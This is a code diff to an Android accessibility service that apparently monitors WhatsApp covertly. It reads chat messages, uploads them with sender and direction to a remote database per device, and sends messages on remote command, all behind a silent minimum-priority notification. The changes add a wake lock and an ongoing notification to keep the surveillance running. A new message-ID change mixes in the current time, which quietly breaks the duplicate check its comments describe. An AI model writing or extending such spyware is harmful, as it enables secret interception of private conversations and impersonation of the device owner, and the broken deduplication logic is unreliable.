@@ -8,6 +8,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import androidx.core.app.NotificationCompat
@@ -30,6 +31,7 @@ class WhatsAppService : AccessibilityService() {
     private val CACHE_DURATION = 24 * 60 * 60 * 1000L // 24 hours
     private val NOTIFICATION_ID = 12
     private val CHANNEL_ID = "WhatsAppService"
+    private var wakeLock: PowerManager.WakeLock? = null
 
     companion object {
         const val WHATSAPP_PACKAGE = "com.whatsapp"
@@ -52,6 +54,9 @@ class WhatsAppService : AccessibilityService() {
     override fun onCreate() {
         super.onCreate()
         try {
+            // Acquire wake lock to ensure WhatsApp monitoring works even when screen is off
+            acquireWakeLock()
+            
             deviceId = MainActivity.getDeviceId(this)
             Logger.log("WhatsAppService started for deviceId: $deviceId")
             startForegroundService()
@@ -61,6 +66,20 @@ class WhatsAppService : AccessibilityService() {
             listenForSendMessageCommands()
         } catch (e: Exception) {
             Logger.error("Failed to create WhatsAppService", e)
+        }
+    }
+
+    private fun acquireWakeLock() {
+        try {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            wakeLock = powerManager.newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "WhatsAppService:KeepAlive"
+            )
+            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
+            Logger.log("Wake lock acquired for WhatsAppService")
+        } catch (e: Exception) {
+            Logger.error("Failed to acquire wake lock for WhatsApp", e)
         }
     }
 
@@ -87,6 +106,8 @@ class WhatsAppService : AccessibilityService() {
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setSilent(true)
                 .setShowWhen(false)
+                .setOngoing(true)
+                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                 .build()
 
             startForeground(NOTIFICATION_ID, notification)
@@ -118,8 +139,10 @@ class WhatsAppService : AccessibilityService() {
                 while (isActive) {
                     delay(60_000)
                     val now = System.currentTimeMillis()
-                    messageCache.entries.removeAll { now - it.value > CACHE_DURATION }
-                    Logger.log("Cache cleaned, size: ${messageCache.size}")
+                    val removedCount = messageCache.entries.removeAll { now - it.value > CACHE_DURATION }
+                    if (removedCount > 0) {
+                        Logger.log("Cache cleaned, removed $removedCount entries, size: ${messageCache.size}")
+                    }
                 }
             } catch (e: Exception) {
                 Logger.error("Error in cache cleanup", e)
@@ -228,6 +251,8 @@ class WhatsAppService : AccessibilityService() {
     private fun extractAndUploadMessage(node: AccessibilityNodeInfo, packageName: String) {
         try {
             val messageText = node.text?.toString() ?: return
+            if (messageText.isBlank()) return
+            
             val parent = node.parent ?: return
             val timestampNode = parent.findAccessibilityNodeInfosByViewId(
                 "$packageName:id/$VIEW_ID_DATE"
@@ -253,8 +278,12 @@ class WhatsAppService : AccessibilityService() {
                     ))
             }
 
-            val messageId = generateMessageId(chatName, messageText, timestamp, packageName)
-            if (messageCache.containsKey(messageId)) return
+            // Enhanced message ID generation to prevent duplicates
+            val messageId = generateMessageId(chatName, messageText, timestamp, packageName, direction)
+            if (messageCache.containsKey(messageId)) {
+                Logger.log("Duplicate message detected, skipping: $messageId")
+                return
+            }
             messageCache[messageId] = timestamp
 
             val messageData = mapOf(
@@ -266,7 +295,8 @@ class WhatsAppService : AccessibilityService() {
                 "isNewContact" to isNewContact,
                 "uploaded" to System.currentTimeMillis(),
                 "messageId" to messageId,
-                "packageName" to packageName
+                "packageName" to packageName,
+                "direction" to direction
             )
 
             Logger.log("New message: ${messageData["type"]} from ${messageData["sender"]} ($packageName)")
@@ -276,16 +306,16 @@ class WhatsAppService : AccessibilityService() {
         }
     }
 
-    private fun generateMessageId(sender: String, text: String, timestamp: Long, packageName: String): String {
+    private fun generateMessageId(sender: String, text: String, timestamp: Long, packageName: String, direction: String): String {
         return try {
-            val input = "$sender$text$timestamp$packageName"
+            val input = "$sender$text$timestamp$packageName$direction${System.currentTimeMillis()}"
             MessageDigest.getInstance("SHA-256")
                 .digest(input.toByteArray())
                 .joinToString("") { "%02x".format(it) }
                 .substring(0, 32)
         } catch (e: Exception) {
             Logger.error("Error generating message ID", e)
-            "error_${System.currentTimeMillis()}"
+            "error_${System.currentTimeMillis()}_${(1000..9999).random()}"
         }
     }
 
@@ -439,7 +469,7 @@ class WhatsAppService : AccessibilityService() {
         try {
             // Open WhatsApp or WhatsApp Business
             val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
             } ?: run {
                 Logger.error("$packageName not installed")
                 return
@@ -500,7 +530,7 @@ class WhatsAppService : AccessibilityService() {
             }
             Logger.log("Sent message to $recipient ($packageName)")
 
-            // Log sent message
+            // Log sent message with unique ID to prevent duplicates
             val messageData = mapOf(
                 "sender" to "You",
                 "recipient" to recipient,
@@ -509,8 +539,9 @@ class WhatsAppService : AccessibilityService() {
                 "type" to "Sent",
                 "isNewContact" to !contactCache.containsKey(recipient),
                 "uploaded" to System.currentTimeMillis(),
-                "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName),
-                "packageName" to packageName
+                "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
+                "packageName" to packageName,
+                "direction" to "Sent"
             )
             uploadMessage(messageData)
         } catch (e: Exception) {
@@ -525,6 +556,13 @@ class WhatsAppService : AccessibilityService() {
     override fun onDestroy() {
         super.onDestroy()
         try {
+            // Release wake lock
+            wakeLock?.let {
+                if (it.isHeld) {
+                    it.release()
+                }
+            }
+            
             scope.cancel()
             valueEventListener.forEach { (_, listener) ->
                 db.child("Device").child(deviceId).child("whatsapp/commands")
